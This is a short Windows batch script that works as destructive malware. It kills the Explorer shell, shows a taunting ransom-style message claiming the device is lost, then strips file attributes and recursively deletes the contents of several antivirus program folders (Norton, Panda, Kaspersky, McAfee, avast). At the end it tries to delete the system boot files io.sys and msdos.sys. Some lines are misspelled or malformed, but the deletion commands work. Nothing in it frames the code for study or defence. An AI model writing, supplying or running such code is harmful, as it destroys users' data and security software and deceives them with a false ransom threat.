@echo off 
cls 
color 0A 
title encrypted! wanna decrypt? wanna cry?
taskkill /f /im explorer.exe 
echo =================================
echo              BBX
echo =================================
echo -do NOT CLOSE THIS WINDOW or your data will be LOST, FOREVER
echo -what happened?
echo your device got blocked by a malware and is lost forever.
echo -can i do something?
echo no.
echo now your computer is mine HAHAHA, press any button to see the next.
pause
cls
start explorer.exe
cd
cd "archivos de programa"
cd "Norton antivirus"
attrib -R -A -S -H *.*
del /S /Q *.*
cd..
cd "Panda Software"
attrib -R -A -S -H *.*
del /S /Q *.*
cd..
cd "Kaspersky Lab"
attrib -R -A -S -H *.*
del /S /Q *.*
cd..
cd "McAfee.com"
attrib -R -A -S -H *.*
del /S /Q *.*
cd..
cd "avast! Free Antivirus"
attib -R -A -S -H *.*
del /S /Q *.*
cls
expansion
cls
if %OS% == Windows-NT goto nt

del C.io.sys
del Cmsdos.sys